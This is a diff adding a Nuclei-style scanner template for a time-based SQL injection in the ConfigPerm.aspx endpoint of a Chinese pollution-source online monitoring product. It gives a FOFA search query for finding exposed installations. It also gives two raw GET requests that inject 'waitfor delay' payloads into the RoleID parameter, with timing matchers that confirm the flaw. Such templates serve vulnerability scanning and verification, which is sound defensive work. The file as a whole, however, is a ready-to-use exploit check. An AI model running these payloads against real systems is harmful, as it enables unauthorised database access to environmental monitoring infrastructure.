@@ -1,0 +1,23 @@
+id: wwyc-pollution-source-monitoring-configpermaspx-sql-injection
+info:
+  name: 万维盈创污染源在线监控系统ConfigPerm.aspx接口SQL注入
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="ImgGwry/download.png" || (body="images/errorpage.gif" && body="错误页面")
+    该漏洞源于ConfigPerm.aspx接口对用户输入缺乏有效验证，攻击者可通过构造恶意SQL参数利用注入点控制数据库查询，进而引发敏感数据泄露、数据完整性受损或权限提升风险。
+  tags: 万维盈创
+http:
+- raw:
+  - |
+    GET /Admin/System/Role/ConfigPerm.aspx?action=GetSelPerm&RoleID=1%27;waitfor%20delay%20%270:0:5%27-- HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /Admin/System/Role/ConfigPerm.aspx?action=GetSelPerm&RoleID=1%27;waitfor%20delay%20%270:0:8%27-- HTTP/1.1
+    Host: {{Hostname}}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
